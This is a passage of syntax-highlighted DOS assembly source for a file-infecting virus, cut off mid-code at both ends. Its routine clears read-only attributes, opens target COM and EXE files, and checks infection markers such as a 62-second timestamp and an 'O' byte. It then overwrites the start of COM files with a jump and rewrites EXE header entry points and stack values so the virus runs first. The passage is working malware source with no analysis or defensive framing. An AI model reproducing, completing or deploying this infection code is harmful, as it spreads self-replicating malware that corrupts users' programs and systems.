&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">and</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cl</span><span style="color: #339933;">,</span><span style="color: #ff0000;">1</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;mask read only bit</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cl</span><span style="color: #339933;">,</span><span style="color: #ff0000;">1</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;read only file?</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;get attrib info again</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jne</span> &nbsp; &nbsp; short open_4_write&nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;continue if not read-only</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">and</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cl</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0FEh</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;otherwise, enable write</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">4301h</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; Int_21h<br />
<br />
open_4_write<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">3D02h</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;open file for r/w</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; Int_21h<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jnb</span> &nbsp; &nbsp; short process_timestamp<br />
<br />
cant_inf<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; cant_infect<br />
<br />
process_timestamp<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xchg</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">bx</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;put file handler into bx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cs</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cs</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ds</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">es</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;es=ds=cs</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">5700h</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;get file Date and Time</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; Int_21h<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;save date</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;save time</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">and</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cl</span><span style="color: #339933;">,</span><span style="color: #ff0000;">1Fh</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;mask out seconds</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cl</span><span style="color: #339933;">,</span><span style="color: #ff0000;">1Fh</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;is time at 62 seconds?</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">je</span>&nbsp; &nbsp; &nbsp; short inf_error &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;jump if it is</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span>offset data_buf&nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;buffer for data</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span>offset Buffer_End<span style="color: #339933;">-</span>offset data_buf<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">3Fh</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;read from file</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; Int_21h &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;bx=file handle</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jnb</span> &nbsp; &nbsp; short read_ok<br />
<br />
inf_error<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stc</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;set carry for error</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; inf_close<br />
<br />
read_ok<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">cx</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;read in 1Ch bytes?</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jne</span> &nbsp; &nbsp; short inf_error &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;exit if error reading</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">dx</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;zero dx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">dx</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;ofs 0&lt;orig of new file pos</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">4202h</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;set pointer to end of file</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; Int_21h<br />
<br />
file_type<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr Disk_ID<span style="color: #339933;">,</span><span style="color: #7f007f;">'ZM'</span> &nbsp; <span style="color: black; font-style: italic;">;EXE header?</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">je</span>&nbsp; &nbsp; &nbsp; short EXE_header&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;jump if yes, COM if no...</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">byte</span> ptr Disk_ID<span style="color: #339933;">+</span><span style="color: #ff0000;">3</span><span style="color: #339933;">,</span><span style="color: #7f007f;">'O'</span>&nbsp; <span style="color: black; font-style: italic;">;is 4th byte from begin a 'O'?</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">je</span>&nbsp; &nbsp; &nbsp; short inf_error &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;get out if it is</span><br />
<br />
COM_start<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span>offset Disk_ID &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;si=beginning of victim</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">di</span><span style="color: #339933;">,</span>offset first_4 &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;di=our storage space</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b00040;">movsd</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;store 1st bytes in our place</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">3</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;sub 3 for jmp statement</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">byte</span> ptr Disk_ID<span style="color: #339933;">,</span><span style="color: #ff0000;">0E9h</span> &nbsp; <span style="color: black; font-style: italic;">;add the jmp statement</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr Disk_ID<span style="color: #339933;">+</span><span style="color: #ff0000;">1</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span> &nbsp; <span style="color: black; font-style: italic;">;add the destination</span><br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">byte</span> ptr Disk_ID<span style="color: #339933;">+</span><span style="color: #ff0000;">3</span><span style="color: #339933;">,</span><span style="color: #7f007f;">'O'</span>&nbsp; <span style="color: black; font-style: italic;">;add the marker</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: black;">&#40;</span>offset Delta_Ofs<span style="color: black;">&#41;</span><span style="color: #339933;">+</span><span style="color: #ff0000;">0103H</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; short cont_inf<br />
<br />
EXE_header<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr Stack_SP<span style="color: #339933;">,</span>offset Virus_End<span style="color: #339933;">+</span><span style="color: #ff0000;">512</span>&nbsp; <span style="color: black; font-style: italic;">;infected?</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">je</span>&nbsp; &nbsp; &nbsp; short inf_error &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;if so, exit</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr Overlays<span style="color: #339933;">,</span><span style="color: #ff0000;">0</span> &nbsp; &nbsp; <span style="color: black; font-style: italic;">;is it an overlay?</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jne</span> &nbsp; &nbsp; short inf_error &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;if not main prog, leave</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cl</span><span style="color: #339933;">,</span><span style="color: #ff0000;">4</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ror</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">cl</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">shr</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">cl</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;convert to paragraphs</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">dx</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;ax:dx=filesize</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">word</span> ptr Header_Size <span style="color: black; font-style: italic;">;subtract header size</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span>offset Start_IP<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">di</span><span style="color: #339933;">,</span>offset first_4 &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;original CS:IP</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b00040;">movsd</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span>offset stack_ss&nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;save stack</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b00040;">movsd</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;ax:dx=filesize</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr start_cs<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span>&nbsp; &nbsp; <span style="color: black; font-style: italic;">;set init CS</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr stack_ss<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span>&nbsp; &nbsp; <span style="color: black; font-style: italic;">;and stack</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr stack_sp<span style="color: #339933;">,</span>offset Virus_End<span style="color: #339933;">+</span><span style="color: #ff0000;">512</span>&nbsp; <span style="color: black; font-style: italic;">;vir+stack size</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> offset Virus_End<span style="color: #339933;">+</span><span style="color: #ff0000;">512</span><span style="color: black; font-style: italic;">;virus + stack size</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jnb</span> &nbsp; &nbsp; short no_carry<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">inc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><br />
<br />
no_carry<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">512</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;take image size</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">div</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr File_Size<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span> &nbsp; <span style="color: black; font-style: italic;">;image size /512</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr Last_Page<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">dx</span> &nbsp; <span style="color: black; font-style: italic;">;imaze size MOD 512</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">and</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0Fh</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr Start_IP<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span>&nbsp; &nbsp; <span style="color: black; font-style: italic;">;set initial ip</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: black;">&#40;</span>offset Delta_Ofs<span style="color: black;">&#41;</span><br />
<br />
cont_inf<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">:</span>Lezbo<span style="color: #339933;">+</span><span style="color: #ff0000;">1</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span>&nbsp; <span style="color: black; font-style: italic;">;Store relative offset</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ds</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">si</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">si</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ds</span><br />
